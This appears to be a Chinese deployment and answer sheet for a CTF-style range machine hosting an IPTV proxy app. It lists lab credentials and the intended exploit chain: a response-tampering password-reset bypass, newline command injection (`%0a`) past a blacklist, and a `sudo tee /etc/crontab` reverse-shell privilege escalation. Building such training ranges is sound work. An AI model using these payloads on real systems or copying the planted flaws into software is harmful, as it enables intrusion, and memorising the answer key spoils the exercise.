# B1 (DMZ) 部署信息

## 服务器信息

| 项目 | 详情 |
|------|------|
| IP | `192.168.120.10` |
| OS | Ubuntu 20.04 |
| SSH | `gdadmin` / `Gdadmin@123` |
| 运营商用户 | `operator` / `0p3rat0r@GDJ` (sudo组) |
| sudo漏洞 | `www-data ALL=(root) NOPASSWD: /usr/bin/tee` |

## 服务

| 服务 | 端口 | 自启 |
|------|:--:|:--:|
| Nginx | 80 | enabled |
| PHP 8.1-FPM | sock | enabled |
| MySQL 8.0 | 3306 | enabled |
| Redis | 6379 | enabled |

## 代码路径

| 位置 | 说明 |
|------|------|
| `/opt/iptv-proxy/` | 应用根目录 |
| `/opt/iptv-proxy/public/index.php` | 路由入口 |
| `/opt/iptv-proxy/src/Controllers/AuthController.php` | 登录 + 3步密码重置 |
| `/opt/iptv-proxy/src/Controllers/DiagController.php` | 网络诊断(命令注入) |
| `/opt/iptv-proxy/src/views/reset-password.php` | 密码重置页面 |
| `/opt/iptv-proxy/src/views/admin/diag/index.php` | 网络诊断页面 |
| `/opt/iptv-proxy/config/config.php` | 数据库/Redis 配置 |

## 凭据

| 用途 | 用户名 | 密码 |
|------|--------|------|
| Web后台 | `admin` | `iPtV@Pr0xy#Adm!n2024` |
| MySQL | `iptvadmin` | `Iptv@Proxy#2024` |
| MySQL root | `root` | socket认证 |
| 安全问题 | `系统初始安装校验码是？` | `BC2024-X9K2` |

## 漏洞链 (已部署部分)

### 信息收集
- 登录框用户名枚举：用户存在→「密码错误」/ 不存在→「用户不存在」

### B-1 — 密码重置绕过 (100分)

**三步流程：**

1. `POST /auth/reset-password` `action=lookup&username=admin` → 返回安全问题
2. `POST /auth/reset-password` `action=verify&answer=xxx`
   - 答案正确(`BC2024-X9K2`) → 后端设置session → **返回 `{"success":false}`**
   - 答案错误 → 直接返回false，不设置session
3. `POST /auth/reset-password` `action=reset&new_password=xxx`
   - 需session中`security_verified`已验证 → 密码实际已修改 → **返回 `{"success":false}`**

**利用：** Burp/Yakit拦截第2、第3步响应，将`"success":false`改为`true`，前端进入下一步。两次改包后密码已被重置。

### B-2 — 命令注入 (200分)

- 路径：`POST /admin/diag/execute`（需登录）
- 参数：`target=127.0.0.1%0aid`
- 黑名单：`| ; & $ `` `
- 绕过：`%0a`(换行)不在黑名单，`urldecode()`后换行执行第二条命令
- 权限：`www-data`

### B-6 — sudo tee 提权 (500分)

```
sudo tee /etc/crontab  # 写cron反弹root shell
```
